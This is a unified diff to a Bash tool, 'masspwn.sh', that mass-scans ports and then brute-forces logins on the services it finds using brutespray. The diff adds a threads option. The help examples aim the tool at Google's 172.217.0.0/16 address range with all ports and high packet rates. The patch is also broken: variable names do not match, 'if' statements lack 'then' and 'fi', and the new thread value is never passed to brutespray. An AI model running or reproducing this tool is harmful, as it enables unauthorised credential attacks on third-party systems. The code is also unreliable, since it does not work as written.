@@ -14,6 +14,7 @@ OUTPUT=""
 USERS=""
 PASSWORDS=""
 RATE=""
+THREADS=""
 
 
 HOSTS_ARG=""
@@ -23,6 +24,7 @@ USERS_ARG=""
 PASSWORDS_ARG=""
 HELP_ARG=""
 RATE_ARG=""
+THREADS_ARG=""
 
 # Mientras el número de argumentos NO SEA 0
 while [ $# -ne 0 ]
@@ -61,6 +63,11 @@ do
 		RATE="$2"
 		shift
         ;;
+	-t|--thread)
+		THREAD_ARG="OK"
+		THREAD="$2"
+		shift
+        ;;
     #*)
     #		echo -e "${red}WARNING: Invalid argument detected${endColor}"
     #		echo ""
@@ -92,14 +99,15 @@ if [[ -z $HOSTS_ARG || -z $PORTS_ARG || -z $OUTPUT_ARG ]];then
 	echo "-u   | --users [USERS WORDLIST]		  Specify custom wordlist for users bruteforce"
 	echo "-pw  | --passwords [PASSWORDS WORDLIST]	  Specify custom wordlist for passwords bruteforce"
 	echo "-r   | --rate [PACKETS PER SECCOND] 	  Set packets per seccond send to find open ports" 
+	echo "-t   | --threads [BRUTEFORCE THREADS] 	  Set the number of threads used for bruteforce with bruespray"
 	echo "--help					  Show this help message and exit"
 	echo
 	echo -e "${yellow}Examples:${endColor}"
-	echo -e "${green}./masspwn.sh -h 172.217.0.0/16 -p1-65535 -r 10000 -o google${endColor}"
-	echo "Scan all ports of Google hosts sending 10000 packets per seccond, bruteforce found services login with brutespray default credentials, and saves results in 'google' folder"
+	echo -e "${green}./masspwn.sh -h 172.217.0.0/16 -p1-65535 -r 10000 -t -o google${endColor}"
+	echo "Scan all ports of Google hosts sending 10000 packets per seccond, bruteforce found services login with brutespray default credentials with 1000 threads, and saves results in 'google' folder"
 	echo
 	echo -e "${green}./masspwn.sh -h host_list.txt -p1-1000 -u /usr/share/wordlists/users.txt -p /usr/share/wordlists/passwords.txt -o results${endColor}"
-	echo "Scan port range of 1 to 1000 of hosts listed in host_list.txt sending 600 packets per seccond, bruteforce found services login with customs wordlists for users and passwords, and saves results in 'results' folder"
+	echo "Scan port range of 1 to 1000 of hosts listed in host_list.txt sending 600 packets per seccond, bruteforce found services login with customs wordlists for users and passwords with 600 threads, and saves results in 'results' folder"
 
 	exit
 fi
@@ -249,13 +257,24 @@ echo -e "${green}###############################################################
 echo
 
 if [[ $USERS_ARG && $PASSWORDS_ARG ]];then
-	echo -e "${purple}brutespray --file $OUTPUT/nmap_results -U $USERS -P $PASSWORDS -o $OUTPUT --threads 6 --hosts 5${endColor}"
-	sleep 2
-	brutespray --file $OUTPUT/nmap_results -U $USERS -P $PASSWORDS -o $OUTPUT --threads 6 --hosts 5
+	if [[ -z $THREADS_ARG ]]
+		echo -e "${purple}brutespray --file $OUTPUT/nmap_results -U $USERS -P $PASSWORDS -o $OUTPUT --threads 6 --hosts 5${endColor}"
+		sleep 2
+		brutespray --file $OUTPUT/nmap_results -U $USERS -P $PASSWORDS -o $OUTPUT --threads 6 --hosts 5
+	else 
+		echo -e "${purple}brutespray --file $OUTPUT/nmap_results -U $USERS -P $PASSWORDS -o $OUTPUT --threads $THREADS --hosts 5${endColor}"
+		sleep 2
+		brutespray --file $OUTPUT/nmap_results -U $USERS -P $PASSWORDS -o $OUTPUT --threads 6 --hosts 5
 else
-	echo -e "${purple}brutespray --file $OUTPUT/nmap_results -o $OUTPUT --threads 6 --hosts 5${endColor}"
-	sleep 2
-	brutespray --file $OUTPUT/nmap_results -o $OUTPUT --threads 6 --hosts 5
+	if [[ -z $THREADS_ARG ]]
+		echo -e "${purple}brutespray --file $OUTPUT/nmap_results -o $OUTPUT --threads 6 --hosts 5${endColor}"
+		sleep 2
+		brutespray --file $OUTPUT/nmap_results -o $OUTPUT --threads 6 --hosts 5
+	else
+		echo -e "${purple}brutespray --file $OUTPUT/nmap_results -o $OUTPUT --threads $THREADS --hosts 5${endColor}"
+		sleep 2
+		brutespray --file $OUTPUT/nmap_results -o $OUTPUT --threads 6 --hosts 5
+	fi
 fi
 
 
